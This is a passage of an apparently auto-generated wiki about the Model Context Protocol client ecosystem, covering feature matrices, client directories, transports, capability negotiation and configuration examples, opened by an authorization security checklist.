- [ ] Support Client ID Metadata Documents (preferred)
- [ ] Support Dynamic Client Registration (fallback)
- [ ] Include `code_challenge_methods_supported` in metadata
- [ ] Implement human-in-the-loop consent for all grant types
- [ ] Issue short-lived access tokens (recommended: < 1 hour)
- [ ] Rotate refresh tokens for public clients
- [ ] Validate redirect URIs exactly (no wildcards)
- [ ] Implement SSRF protection for Client ID Metadata Document fetches
- [ ] Display warnings for `localhost`-only redirect URIs
- [ ] Validate state parameter matches for callback requests
- [ ] Serve all endpoints over HTTPS
- [ ] Implement token introspection endpoint for audience validation
- [ ] Support incremental scope elevation via `insufficient_scope` challenges

**Sources:** [docs/specification/draft/basic/authorization.mdx:1-711](), [docs/specification/draft/basic/security_best_practices.mdx:1-439]()

---

# Page: Client Ecosystem

# Client Ecosystem

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [CLAUDE.md](CLAUDE.md)
- [docs/clients.mdx](docs/clients.mdx)
- [docs/docs/tutorials/security/authorization.mdx](docs/docs/tutorials/security/authorization.mdx)
- [docs/sdk/java/mcp-client.mdx](docs/sdk/java/mcp-client.mdx)
- [docs/sdk/java/mcp-overview.mdx](docs/sdk/java/mcp-overview.mdx)
- [docs/sdk/java/mcp-server.mdx](docs/sdk/java/mcp-server.mdx)

</details>



This page documents the MCP client ecosystem: the applications that integrate with MCP servers to expose tools, resources, prompts, and other capabilities to users and AI models. The ecosystem includes desktop applications, IDE extensions, web platforms, CLI tools, and specialized frameworks. For information about building MCP clients or using the client SDKs, see [Integration Patterns](#4.2). For details about the MCP protocol features themselves, see [Protocol Specification](#2).

## Client Feature Support

The MCP client ecosystem exhibits a power law distribution in feature adoption. The protocol defines twelve capabilities across server-exposed, client-exposed, and lifecycle categories. Actual client implementations range from full-featured platforms supporting all capabilities to minimal integrations that expose only tool invocation.

**Feature Categories**

The feature matrix in [docs/clients.mdx:8-23]() documents twelve distinct capabilities organized by category:

| Category | Feature | Description |
|----------|---------|-------------|
| Server-Exposed | Resources | Attachment of local files and data via URI templates |
| Server-Exposed | Prompts | Prompt template library with arguments |
| Server-Exposed | Tools | Function invocation with input/output schemas |
| Server-Exposed | Instructions | Server-provided usage metadata and guidance |
| Server-Exposed | Discovery | Dynamic tool/resource registration updates |
| Client-Exposed | Sampling | LLM completion requests from servers |
| Client-Exposed | Elicitation | User input collection (form and URL modes) |
| Client-Exposed | Roots | Filesystem boundary declarations |
| Extensions | CIMD | Client ID Metadata Document support (SEP-991) |
| Extensions | DCR | Dynamic Client Registration support (RFC 7591) |
| Extensions | Tasks | Long-running operation tracking |
| Extensions | Apps | Interactive HTML interfaces (MCP Apps) |

**Adoption Patterns**

The `Tools` capability represents the baseline value proposition, with ~95% adoption across all clients. This validates MCP's primary use case: enabling LLMs to invoke executable functions. Secondary features like `Resources` (~40%) and `Prompts` (~40%) see moderate adoption, while advanced capabilities like `Sampling` (~15%), `Tasks` (~10-15%), and `Apps` serve specialized use cases.

Sources: [docs/clients.mdx:8-23]()

## Client Transport and Configuration

Clients choose between two transport mechanisms based on deployment model and server location:

**Transport Mechanisms**

| Transport | Deployment | Authentication | Examples |
|-----------|-----------|-----------------|----------|
| stdio | Local process | Environment variables, embedded credentials | Claude Desktop, Continue, Cline, Amazon Q CLI |
| Streamable HTTP + SSE | Remote servers | OAuth 2.1 (mandatory) | Claude.ai, ChatGPT, Glama, Gemini |

The stdio transport is used by desktop applications and IDE extensions for local server connections, characterized by zero network overhead and process isolation. The Streamable HTTP transport with Server-Sent Events is required for remote, multi-tenant server deployments and mandates OAuth 2.1 authorization (see [Authorization and Security](#3)).

**Configuration Patterns**

Clients employ three primary configuration strategies:

| Strategy | Mechanism | Examples |
|----------|-----------|----------|
| File-Based | JSON configuration files | `claude_desktop_config.json` (Claude Desktop), `mcp.json` (VS Code) |
| UI-Based | Graphical server management | Web platforms (Claude.ai, ChatGPT), desktop apps (BoltAI, Chatbox) |
| Runtime | Environment variables, dynamic discovery | CLI tools, framework integrations |

Desktop clients typically use JSON configuration files to define server connections with command arguments. Web and desktop applications provide graphical interfaces for server connection management, OAuth credential flow initiation, and feature enable/disable per server. Advanced clients support environment variable substitution for credentials and dynamic server registration via discovery protocols.

Sources: [docs/clients.mdx:1-220](), [docs/tutorials/security/authorization.mdx:1-50]()

## Client Directory and Feature Matrix

The complete client directory is maintained in [docs/clients.mdx]() with a searchable, filterable interface. The feature matrix uses color-coded badges to indicate capability support:

**Feature Badge Colors**

| Color | Features |
|-------|----------|
| Blue | Server capabilities (Resources, Prompts, Tools) |
| Green | Client capabilities (Sampling, Roots, Elicitation) |
| Purple | Lifecycle features (Instructions, Discovery) |
| Yellow | Authorization extensions (CIMD, DCR) |
| Orange | Advanced features (Tasks, Apps) |

The `McpClient` component in [docs/clients.mdx:156-278]() renders each client entry with:
- Client name and homepage link
- Supported features with color-coded badges
- Source code link (if available)
- Configuration instructions
- Expandable description with key features

The `ClientFilter` component in [docs/clients.mdx:82-153]() enables filtering by:
- Feature selection (multi-select)
- Text search by client name
- Real-time result count display

This standardized format enables developers to quickly assess client compatibility for their use cases.

Sources: [docs/clients.mdx:1-220]()

## Notable Client Implementations

The client ecosystem spans multiple categories based on feature support and deployment model. Key implementations include:

**Desktop Applications**

- **Claude Desktop App** [docs/clients.mdx:701-720](): Anthropic's flagship client with Resources, Prompts, and Tools support. Uses `claude_desktop_config.json` for local server configuration via stdio transport. Supports both local servers and remote servers via DCR.

- **BoltAI** [docs/clients.mdx:562-582](): Native macOS client supporting multiple AI providers (OpenAI, Anthropic, Google AI, Ollama). Features MCP tool integrations, quick setup via Claude Desktop import, and remote MCP server support in mobile app.

- **AIQL TUUI** [docs/clients.mdx:367-389](): Native cross-platform desktop client supporting multiple AI providers (Anthropic, OpenAI, Deepseek, Qwen). Implements dynamic LLM/agent switching, configurable tools, advanced sampling control, and cross-platform compatibility (macOS, Windows, Linux).

**IDE Extensions**

- **Continue** [docs/clients.mdx:795-811](): Open-source AI code assistant supporting VS Code and JetBrains. Surfaces MCP resources via `@` mentions, prompts as slash commands, and tools directly in chat. Compatible with any LLM provider.

- **Cline** [docs/clients.mdx:740-754](): Autonomous coding agent in VS Code. Unique in its natural language tool creation and sharing of custom MCP servers via `~/Documents/Cline/MCP` directory.

- **Cursor** [docs/clients.mdx:829-846](): AI code editor with support for MCP tools in Cursor Composer, roots, prompts, elicitation, and both STDIO and SSE transports.

**Web Platforms**

- **Claude.ai** [docs/clients.mdx:722-737](): Anthropic's web-based assistant with support for remote MCP servers via integrations UI. Supports Resources, Prompts, Tools, CIMD, and DCR.

- **ChatGPT** [docs/clients.mdx:635-650](): OpenAI's assistant with MCP support for remote servers via connections UI in settings. Enterprise-grade security and compliance features. Supports Tools and DCR.

- **Gemini CLI** [docs/clients.mdx:975-983](): Open-source AI agent bringing Gemini into the terminal. Supports Prompts, Tools, Instructions, and DCR.

**Framework Integrations**

- **fast-agent** [docs/clients.mdx:898-913](): Python Agent framework with full multi-modal support (PDF, Image) based on MCP native types. Includes interactive frontend for development and diagnosis, built-in "Building Effective Agents" workflows, and ability to deploy agents as MCP servers.

- **Genkit** [docs/clients.mdx:1002-1015](): Cross-language SDK for building GenAI features. The `genkitx-mcp` plugin enables consuming MCP servers as a client or creating MCP servers from Genkit tools and prompts.

- **BeeAI Framework** [docs/clients.mdx:541-560](): Open-source framework for building agentic workflows. Includes native MCP Tool feature for seamless integration of MCP servers into workflows.

Sources: [docs/clients.mdx:1-220]()

## Client Implementation Patterns

**SDK Usage**

Clients integrate with MCP servers using language-specific SDKs. The Java SDK provides both synchronous and asynchronous client APIs:

```java
// Sync client example
McpSyncClient client = McpClient.sync(transport)
    .requestTimeout(Duration.ofSeconds(10))
    .capabilities(ClientCapabilities.builder()
        .roots(true)
        .sampling()
        .elicitation()
        .build())
    .build();

client.initialize();
ListToolsResult tools = client.listTools();
CallToolResult result = client.callTool(
    new CallToolRequest("calculator", Map.of("a", 2, "b", 3))
);
```

See [Java MCP Client](/sdk/java/mcp-client) for complete SDK documentation.

**Transport Implementation**

Clients implement transport-specific handlers:

| Transport | Client Implementation | Key Classes |
|-----------|----------------------|-------------|
| stdio | Process spawning + stdin/stdout | `StdioClientTransport` |
| Streamable HTTP | HTTP POST/GET + SSE | `HttpClientStreamableHttpTransport`, `HttpClientSseClientTransport` |
| Spring WebFlux | Reactive HTTP streaming | `WebClientStreamableHttpTransport`, `WebFluxSseClientTransport` |

**Capability Negotiation**

During initialization, clients declare supported capabilities via `ClientCapabilities`:

```java
ClientCapabilities.builder()
    .roots(true)           // Filesystem boundary support
    .sampling()            // LLM completion requests
    .elicitation()         // User input collection
    .build()
```

The server responds with `ServerCapabilities` indicating which features it exposes. This negotiation enables graceful degradation when clients and servers have mismatched feature support.

Sources: [docs/sdk/java/mcp-client.mdx:14-150](), [docs/clients.mdx:1-220]()

## Ecosystem Growth Metrics

The client ecosystem experienced explosive growth through 2024-2025:

- **September 2024**: Initial batch of clients documented in MCP Registry
- **November 2025**: 96+ clients documented, representing significant diversification across:
  - Desktop applications (Claude Desktop, BoltAI, Chatbox)
  - IDE extensions (VS Code, JetBrains, Continue, Cline)
  - Web platforms (Claude.ai, ChatGPT, Glama)
  - CLI tools (Amazon Q CLI, goose, gptme)
  - Specialized frameworks (fast-agent, Swarms, BeeAI)

The 96+ documented clients represent only clients with verified MCP support. The actual ecosystem is likely larger, as the registry focuses on clients with public documentation or community-verified implementations.

**Platform Distribution**

Clients span multiple computing platforms:
- Desktop: macOS, Windows, Linux native applications
- Web: Browser-based platforms requiring no installation
- Mobile: iOS and Android clients (BoltAI mobile, WhatsMCP)
- CLI: Terminal-based tools for developer workflows
- IDE: Editor extensions and plugins

This platform diversity validates MCP's design as a universal protocol for AI-to-application integration, independent of deployment environment.

Sources: [docs/clients.mdx:1-220](), [blog/content/posts/2025-11-25-first-mcp-anniversary.md:1-272]()

---

# Page: Client Directory and Feature Matrix

# Client Directory and Feature Matrix

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [.github/CODEOWNERS](.github/CODEOWNERS)
- [docs/clients.mdx](docs/clients.mdx)
- [docs/docs/tutorials/security/authorization.mdx](docs/docs/tutorials/security/authorization.mdx)
- [docs/sdk/java/mcp-client.mdx](docs/sdk/java/mcp-client.mdx)
- [docs/sdk/java/mcp-overview.mdx](docs/sdk/java/mcp-overview.mdx)
- [docs/sdk/java/mcp-server.mdx](docs/sdk/java/mcp-server.mdx)
- [docs/specification/draft/basic/utilities/tasks.mdx](docs/specification/draft/basic/utilities/tasks.mdx)
- [docs/specification/draft/client/elicitation.mdx](docs/specification/draft/client/elicitation.mdx)
- [docs/specification/draft/client/sampling.mdx](docs/specification/draft/client/sampling.mdx)
- [docs/specification/draft/schema.mdx](docs/specification/draft/schema.mdx)
- [schema/draft/schema.json](schema/draft/schema.json)
- [schema/draft/schema.ts](schema/draft/schema.ts)

</details>



## Purpose and Scope

This page catalogs all known MCP client implementations and documents their supported features through a standardized feature matrix. It serves as a reference for understanding which MCP capabilities each client supports, enabling users to identify compatible clients for their use cases and developers to understand the landscape of MCP client implementations.

For information about how to integrate MCP servers with specific clients, see [Client Integration Patterns](4.2). For details about the protocol features themselves, see [Protocol Specification](2).

## Feature Categories and Badge System

MCP clients support various protocol features, each represented by a colored badge in the client directory. The feature system is defined in [docs/clients.mdx:8-23](), which establishes the complete feature set and their visual categorization.

| Feature Category | Features | Purpose |
|---|---|---|
| **Server Features** (blue) | Resources, Prompts, Tools | Core server-provided capabilities that clients can access |
| **Client Features** (green) | Sampling, Roots, Elicitation | Client-provided capabilities that servers can request |
| **Discovery** (purple) | Discovery, Instructions | Dynamic capability and metadata discovery |
| **Authorization** (yellow) | CIMD, DCR | Client registration and authorization mechanisms |
| **Advanced** (orange) | Tasks, Apps | Long-running operations and interactive interfaces |

### Feature Definitions

**Resources** — Server-exposed data and content accessible via URI-based patterns

**Prompts** — Pre-defined templates for LLM interactions

**Tools** — Executable functions that LLMs can invoke

**Discovery** — Support for tools/prompts/resources changed notifications

**Instructions** — Server-provided guidance for LLMs

**Sampling** — Server-initiated LLM completions (see [Sampling](2.6))

**Roots** — Filesystem boundary definitions (see [Client Features](2.6))

**Elicitation** — User information requests (see [Client Features](2.6))

**CIMD** — Client ID Metadata Document support for authorization

**DCR** — Dynamic Client Registration support for authorization

**Tasks** — Long-running operation tracking (see [Task System](2.7))

**Apps** — Interactive HTML interfaces (see [Extensions Framework](2.8))

Sources: [docs/clients.mdx:8-298]()

## Client Directory Structure

The client directory is implemented as a React component system in [docs/clients.mdx]() that provides:

1. **ClientFilter** component — Enables search and multi-feature filtering
2. **McpClient** component — Renders individual client entries with metadata
3. **FeatureBadge** component — Displays feature support with color coding

### Filter and Search Mechanism

The filtering system uses a shared state store (`filterStore`) that tracks:
- `selectedFeatures` — Array of currently selected feature filters
- `searchText` — Text query for client name matching
- `visibleCount` / `totalCount` — Pagination metrics

Clients are filtered using the `useFilter` hook [docs/clients.mdx:58-79](), which applies both text search and feature matching logic:

```
isVisible = (
  name.toLowerCase().includes(searchText.toLowerCase()) AND
  selectedFeatures.every(feature => supports?.includes(feature))
)
```

Sources: [docs/clients.mdx:30-153]()

## Client Entry Structure

Each client entry contains the following metadata:

| Field | Type | Description |
|---|---|---|
| `name` | string | Display name of the client |
| `homepage` | string | URL to client's main website or repository |
| `supports` | string | Comma-separated list of supported features |
| `sourceCode` | string (optional) | URL to source code repository |
| `instructions` | string or array | Configuration documentation link(s) |
| `children` | markdown | Description and key features |

The `McpClient` component [docs/clients.mdx:156-278]() processes this metadata to:
- Generate a URL-safe slug for anchor linking
- Sort features according to the canonical feature order
- Handle multiple instruction links
- Manage expandable content overflow
- Apply visibility filtering

Sources: [docs/clients.mdx:156-278]()

## Feature Support Matrix

The following diagram shows the relationship between client implementations and their supported features:

```mermaid
graph TB
    subgraph "Clients"
        C1["Claude Desktop"]
        C2["Claude.ai"]
        C3["ChatGPT"]
        C4["Cursor"]
        C5["VS Code Extensions"]
        C6["Other Clients"]
    end
    
    subgraph "Server Features"
        SF1["Resources"]
        SF2["Prompts"]
        SF3["Tools"]
    end
    
    subgraph "Client Features"
        CF1["Sampling"]
        CF2["Roots"]
        CF3["Elicitation"]
    end
    
    subgraph "Discovery"
        D1["Discovery"]
        D2["Instructions"]
    end
    
    subgraph "Authorization"
        A1["CIMD"]
        A2["DCR"]
    end
    
    subgraph "Advanced"
        AD1["Tasks"]
        AD2["Apps"]
    end
    
    C1 --> SF1
    C1 --> SF2
    C1 --> SF3
    C1 --> CF2
    C1 --> A2
    C1 --> AD2
    
    C2 --> SF1
    C2 --> SF2
    C2 --> SF3
    C2 --> A1
    C2 --> A2
    
    C3 --> SF3
    C3 --> A2
    
    C4 --> SF2
    C4 --> SF3
    C4 --> CF2
    C4 --> CF3
    C4 --> A2
    
    C5 --> SF1
    C5 --> SF2
    C5 --> SF3
    
    C6 --> SF1
    C6 --> SF2
    C6 --> SF3
    C6 --> CF1
    C6 --> CF2
    C6 --> CF3
    
    style SF1 fill:none,stroke:blue
    style SF2 fill:none,stroke:blue
    style SF3 fill:none,stroke:blue
    style CF1 fill:none,stroke:green
    style CF2 fill:none,stroke:green
    style CF3 fill:none,stroke:green
    style D1 fill:none,stroke:purple
    style D2 fill:none,stroke:purple
    style A1 fill:none,stroke:yellow
    style A2 fill:none,stroke:yellow
    style AD1 fill:none,stroke:orange
    style AD2 fill:none,stroke:orange
```

**Client Feature Support Overview**

This diagram illustrates representative feature coverage across major client categories. Actual support varies by client implementation.

Sources: [docs/clients.mdx:8-23]()

## Notable Client Implementations

### Major Clients with Comprehensive Support

**Claude Desktop** — Supports Resources, Prompts, Tools, Apps, and DCR. Provides both local server connections and remote server support via custom connectors.

**Claude.ai** — Web-based client supporting Resources, Prompts, Tools, CIMD, and DCR for remote MCP servers.

**ChatGPT** — Supports Tools and DCR for remote server integration.

**Cursor** — IDE-integrated client supporting Prompts, Tools, Roots, Elicitation, and DCR.

### Specialized Clients

**Cline** — VS Code autonomous coding agent with Resources, Tools, and Discovery support.

**Continue** — Open-source code assistant supporting Resources, Prompts, and Tools across VS Code and JetBrains IDEs.

**Amazon Q CLI** — Terminal-based agentic assistant with Prompts and Tools support.

**Amp** — Multiplayer coding tool supporting Resources, Prompts, Tools, and Sampling.

### Framework and Library Clients

**BeeAI Framework** — Agentic workflow framework with native MCP Tool integration.

**Genkit** — Cross-language SDK with genkitx-mcp plugin for consuming MCP servers as client or creating servers from tools/prompts.

**fast-agent** — Python agent framework with full multi-modal support and MCP server deployment capabilities.

Sources: [docs/clients.mdx:309-1500]()

## Client Capability Negotiation

Clients declare their capabilities during the MCP initialization handshake using the `ClientCapabilities` interface [schema/draft/schema.ts:468-567](). The capabilities structure includes:

```
ClientCapabilities {
  roots?: { listChanged?: boolean }
  sampling?: { context?: object, tools?: object }
  elicitation?: { form?: object, url?: object }
  tasks?: { list?: object, cancel?: object, requests?: {...} }
  extensions?: { [key: string]: object }
  experimental?: { [key: string]: object }
}
```

Servers use this information to determine which client-side features they can request. For example, a server can only send sampling requests if the client declares `sampling` capability.

Sources: [schema/draft/schema.ts:468-567]()

## Authorization Support in Clients

Clients support two primary authorization mechanisms:

**CIMD (Client ID Metadata Documents)** — Clients provide pre-configured authorization metadata, enabling servers to discover authorization requirements without additional registration steps.

**DCR (Dynamic Client Registration)** — Clients support OAuth 2.1 Dynamic Client Registration, allowing them to register with authorization servers at runtime.

Both mechanisms are part of the MCP authorization framework. For detailed authorization information, see [OAuth 2.1 Authorization Framework](3.1).

Sources: [docs/clients.mdx:294-295]()

## Transport Support Across Clients

Clients support different transport mechanisms for connecting to MCP servers:

| Transport | Use Case | Clients |
|---|---|---|
| **STDIO** | Local subprocess communication | Most desktop and IDE clients |
| **Streamable HTTP** | Remote server connections | Web-based clients, remote-capable desktop clients |
| **SSE** | Server-sent events streaming | Web clients, some remote clients |

The transport layer is transparent to the feature matrix — clients may support the same features across different transports.

Sources: [docs/clients.mdx]()

## Community-Maintained Client List

The client directory in [docs/clients.mdx]() is maintained by the community. The list includes:

- **~100+ documented clients** spanning various categories
- **Desktop applications** (Claude Desktop, Cursor, VS Code extensions)
- **Web-based clients** (Claude.ai, ChatGPT)
- **IDE integrations** (Continue, Cline, CodeGPT)
- **Framework libraries** (BeeAI, Genkit, fast-agent)
- **Specialized tools** (Amazon Q, Apidog, Chatbox)

Each entry includes:
- Feature support badges
- Configuration instructions
- Source code links (where available)
- Detailed descriptions of capabilities

### Contributing Updates

The community can submit pull requests to update client information at [https://github.com/modelcontextprotocol/modelcontextprotocol/pulls](). Updates should include:

1. Accurate feature support based on current client implementation
2. Links to official documentation or configuration guides
3. Source code repository links where applicable
4. Clear descriptions of key features and integration patterns

Sources: [docs/clients.mdx:299-303]()

## Feature Implementation Patterns

### Server Features Pattern

Clients implementing server features (Resources, Prompts, Tools) follow a discovery-then-use pattern:

1. **Discovery** — Client calls `resources/list`, `prompts/list`, or `tools/list`
2. **Access** — Client calls `resources/read`, `prompts/get`, or `tools/call`
3. **Notifications** — Client optionally subscribes to change notifications

### Client Features Pattern

Servers request client features (Sampling, Elicitation, Roots) through request-response patterns:

1. **Request** — Server sends `sampling/createMessage`, `elicitation/create`, or `roots/list`
2. **User Interaction** — Client presents UI and gathers user input/approval
3. **Response** — Client returns result or error

### Discovery Pattern

Clients supporting Discovery capability receive notifications when server capabilities change:

- `notifications/resources/list_changed`
- `notifications/prompts/list_changed`
- `notifications/tools/list_changed`

Sources: [docs/clients.mdx](), [schema/draft/schema.ts]()

## Filtering and Discovery UI

The client directory provides interactive filtering through the `ClientFilter` component [docs/clients.mdx:82-153](), which enables:

1. **Text search** — Filter clients by name
2. **Feature selection** — Multi-select feature filters with AND logic
3. **Result counting** — Display visible vs. total client count
4. **Filter clearing** — Reset all filters with one action

The filter state is managed through a shared store that updates all `McpClient` components in real-time using the `useFilter` hook.

Sources: [docs/clients.mdx:82-153]()

## Relationship to Other Documentation

This page serves as the entry point for understanding MCP client capabilities. Related pages provide deeper context:

- **[Client Integration Patterns](4.2)** — How to configure specific clients
- **[Protocol Specification](2)** — Details of protocol features
- **[Client Features](2.6)** — Sampling, Elicitation, Roots specifications
- **[Server Features](2.5)** — Tools, Resources, Prompts specifications
- **[Extensions Framework](2.8)** — Apps and authorization extensions
- **[OAuth 2.1 Authorization Framework](3.1)** — Authorization mechanisms

Sources: [docs/clients.mdx]()

---

# Page: Client Integration Patterns

# Client Integration Patterns

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [CLAUDE.md](CLAUDE.md)
- [docs/clients.mdx](docs/clients.mdx)
- [docs/docs/tutorials/security/authorization.mdx](docs/docs/tutorials/security/authorization.mdx)
- [docs/examples.mdx](docs/examples.mdx)
- [docs/sdk/java/mcp-client.mdx](docs/sdk/java/mcp-client.mdx)
- [docs/sdk/java/mcp-overview.mdx](docs/sdk/java/mcp-overview.mdx)
- [docs/sdk/java/mcp-server.mdx](docs/sdk/java/mcp-server.mdx)

</details>



## Purpose and Scope

This page documents how MCP servers integrate with various client applications. It covers configuration patterns, transport selection, capability negotiation, and client-specific setup procedures. This material focuses on the practical integration of MCP servers into existing client applications.

For information about the MCP client implementations themselves, see [Available SDKs and Language Support](#6.2). For details about building MCP servers, see [Building MCP Servers](#5.1). For authorization patterns, see [OAuth 2.1 Authorization Framework](#3.1).

## Overview of Client Integration

MCP clients connect to servers through standardized transport mechanisms and negotiate capabilities during initialization. The integration pattern depends on the client type, transport mechanism, and whether the server is local (stdio) or remote (HTTP/SSE).

```mermaid
graph TB
    subgraph "Client Types"
        DESKTOP["Desktop Applications<br/>(Claude, VS Code, Cursor)"]
        WEB["Web Applications<br/>(ChatGPT, Claude.ai)"]
        CLI["CLI Tools<br/>(Gemini CLI, Amazon Q)"]
        FRAMEWORK["Frameworks<br/>(Continue, Genkit)"]
    end
    
    subgraph "Configuration Methods"
        CONFIG_FILE["Configuration Files<br/>(mcp.json, config.json)"]
        ENV_VARS["Environment Variables"]
        DYNAMIC["Dynamic Registration<br/>(DCR, CIMD)"]
        MANUAL["Manual Setup"]
    end
    
    subgraph "Transport Layer"
        STDIO["STDIO Transport<br/>Local subprocess"]
        HTTP_SSE["HTTP + SSE<br/>Remote servers"]
    end
    
    subgraph "Initialization"
        INIT["Initialize Request<br/>Protocol negotiation"]
        CAP_NEG["Capability Negotiation<br/>Feature discovery"]
        READY["Ready for Operations<br/>Tools, Resources, Prompts"]
    end
    
    DESKTOP --> CONFIG_FILE
    WEB --> DYNAMIC
    CLI --> ENV_VARS
    FRAMEWORK --> CONFIG_FILE
    
    CONFIG_FILE --> STDIO
    CONFIG_FILE --> HTTP_SSE
    ENV_VARS --> STDIO
    DYNAMIC --> HTTP_SSE
    MANUAL --> STDIO
    
    STDIO --> INIT
    HTTP_SSE --> INIT
    INIT --> CAP_NEG
    CAP_NEG --> READY
    
    style DESKTOP fill:none,stroke:black
    style WEB fill:none,stroke:black
    style CLI fill:none,stroke:black
    style FRAMEWORK fill:none,stroke:black
```

Sources: [docs/clients.mdx:1-300]()

## Configuration Patterns

### Configuration File Format

Most desktop and framework-based clients use a JSON configuration file to define MCP servers. The standard format includes server name, command/URL, arguments, and environment variables.

**Local Server Configuration (STDIO)**

```json
{
  "mcpServers": {
    "filesystem": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-filesystem", "/path/to/allowed/files"]
    },
    "memory": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-memory"]
    }
  }
}
```

**Remote Server Configuration (HTTP/SSE)**

```json
{
  "mcpServers": {
    "github": {
      "url": "https://mcp-server.example.com",
      "auth": {
        "type": "oauth"
      }
    }
  }
}
```

Sources: [docs/examples.mdx:57-85](), [docs/clients.mdx:705-720]()

### Environment Variable Injection

Clients support passing environment variables to server processes. This is commonly used for API keys, tokens, and configuration parameters.

```json
{
  "mcpServers": {
    "github": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-github"],
      "env": {
        "GITHUB_PERSONAL_ACCESS_TOKEN": "<YOUR_TOKEN>"
      }
    }
  }
}
```

Sources: [docs/examples.mdx:76-82]()

## Transport Selection and Setup

The choice of transport mechanism depends on whether the server runs locally or remotely.

### STDIO Transport (Local Servers)

STDIO transport is used for local subprocess-based servers. The client spawns a process and communicates via stdin/stdout with JSON-RPC messages.

**Characteristics:**
- Process-based communication
- No network overhead
- Direct access to local resources
- Suitable for development and local tools

**Client Setup:**
The client specifies a `command` and `args` array that define how to spawn the server process. The client handles process lifecycle management, including startup, shutdown, and error handling.

Sources: [docs/clients.mdx:309-720]()

### HTTP + SSE Transport (Remote Servers)

HTTP with Server-Sent Events (SSE) is used for remote servers. The client makes HTTP requests to the server endpoint and receives streaming responses via SSE.

**Characteristics:**
- Network-based communication
- Suitable for cloud-hosted servers
- Requires authorization (OAuth 2.1)
- Supports multiple concurrent clients

**Client Setup:**
The client specifies a `url` pointing to the remote server endpoint. For protected resources, the client handles OAuth 2.1 authorization flows automatically.

Sources: [docs/clients.mdx:636-737]()

## Capability Negotiation

During initialization, clients and servers exchange capability information to determine which features are supported.

```mermaid
graph LR
    subgraph "Client Capabilities"
        C_ROOTS["roots<br/>Filesystem boundaries"]
        C_SAMPLING["sampling<br/>LLM access"]
        C_ELICIT["elicitation<br/>User input"]
    end
    
    subgraph "Server Capabilities"
        S_TOOLS["tools<br/>Executable functions"]
        S_RESOURCES["resources<br/>Data access"]
        S_PROMPTS["prompts<br/>Templates"]
        S_LOGGING["logging<br/>Structured logs"]
    end
    
    subgraph "Negotiation Process"
        INIT_REQ["Initialize Request<br/>Client capabilities"]
        INIT_RESP["Initialize Response<br/>Server capabilities"]
        READY["Negotiation Complete<br/>Both sides know features"]
    end
    
    C_ROOTS --> INIT_REQ
    C_SAMPLING --> INIT_REQ
    C_ELICIT --> INIT_REQ
    
    INIT_REQ --> INIT_RESP
    
    S_TOOLS --> INIT_RESP
    S_RESOURCES --> INIT_RESP
    S_PROMPTS --> INIT_RESP
    S_LOGGING --> INIT_RESP
    
    INIT_RESP --> READY
```

Sources: [docs/sdk/java/mcp-client.mdx:329-339]()

### Client Capability Declaration

Clients declare their capabilities during initialization. These capabilities inform the server about what features the client supports.

| Capability | Purpose | Use Case |
|-----------|---------|----------|
| `roots` | Filesystem boundary definitions | Servers need to know accessible directories |
| `sampling` | Server-initiated LLM completions | Servers can request AI model interactions |
| `elicitation` | User information requests | Servers can ask for user input |

Sources: [docs/sdk/java/mcp-client.mdx:40-59]()

### Server Capability Declaration

Servers declare their capabilities during initialization. These inform the client about what features the server provides.

| Capability | Purpose | Use Case |
|-----------|---------|----------|
| `tools` | Executable functions | LLMs can invoke server-provided tools |
| `resources` | URI-based data access | Clients can retrieve server-provided data |
| `prompts` | Template-based interactions | Clients can use server-provided prompt templates |
| `logging` | Structured log messages | Servers can send logs to clients |

Sources: [docs/sdk/java/mcp-server.mdx:521-532]()

## Client-Specific Integration Patterns

### Claude Desktop

Claude Desktop is the primary desktop client for MCP. It supports local STDIO servers and remote HTTP/SSE servers with full capability support.

**Configuration Location:** `~/.config/Claude/claude_desktop_config.json` (Linux/Mac) or `%APPDATA%\Claude\claude_desktop_config.json` (Windows)

**Supported Features:**
- Resources, Prompts, Tools (full support)
- Apps (interactive HTML interfaces)
- DCR (Dynamic Client Registration)

**Setup Steps:**
1. Create or edit the configuration file
2. Add server entries with `command` and `args` for local servers, or `url` for remote servers
3. Restart Claude Desktop
4. Servers appear in the MCP section of the interface

Sources: [docs/clients.mdx:701-720]()

### VS Code / Cursor

VS Code and Cursor support MCP through extensions and configuration. Both use similar configuration patterns.

**Configuration Location:** `.vscode/settings.json` or client-specific config

**Supported Features:**
- Tools, Resources, Prompts
- Roots (filesystem boundaries)
- Elicitation (user input)
- DCR support

**Setup Steps:**
1. Install the MCP extension (if required)
2. Configure servers in settings or dedicated config file
3. Servers are automatically discovered and available in the editor

Sources: [docs/clients.mdx:830-846]()

### ChatGPT and Claude.ai (Web)

Web-based clients use remote HTTP/SSE servers exclusively. They support dynamic client registration for authorization.

**Supported Features:**
- Tools, Resources, Prompts
- DCR (Dynamic Client Registration)
- CIMD (Client ID Metadata Documents)

**Setup Steps:**
1. Navigate to client settings
2. Add MCP server via connections UI
3. Provide server URL
4. Client handles OAuth authorization automatically

Sources: [docs/clients.mdx:636-737]()

### CLI Tools (Gemini CLI, Amazon Q)

CLI tools support both STDIO and HTTP/SSE transports. Configuration is typically via command-line arguments or environment variables.

**Supported Features:**
- Tools, Prompts
- Instructions (server-provided guidance)
- DCR support

**Setup Steps:**
1. Install the CLI tool
2. Configure servers via config file or environment variables
3. Invoke the tool with server references

Sources: [docs/clients.mdx:975-983](), [docs/clients.mdx:392-413]()

### Framework Integration (Continue, Genkit, BeeAI)

Frameworks provide programmatic APIs for MCP integration. Servers are configured in code or configuration files.

**Integration Pattern:**
Frameworks typically provide:
- Client factory methods
- Transport configuration
- Capability negotiation helpers
- Tool/resource/prompt discovery APIs

**Example Configuration:**
```json
{
  "mcpServers": {
    "memory": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-memory"]
    }
  }
}
```

Sources: [docs/clients.mdx:796-811](), [docs/clients.mdx:542-560]()

## Authorization for Remote Servers

Remote servers accessed via HTTP/SSE require authorization. The standard approach uses OAuth 2.1 with automatic client registration.

```mermaid
graph TB
    subgraph "Client-Side"
        CLIENT["MCP Client<br/>(ChatGPT, Claude.ai)"]
        BROWSER["Browser/UI<br/>User authorization"]
    end
    
    subgraph "Server-Side"
        MCP_SERVER["MCP Server<br/>(HTTP endpoint)"]
        AUTH_SERVER["Authorization Server<br/>(OAuth 2.1)"]
    end
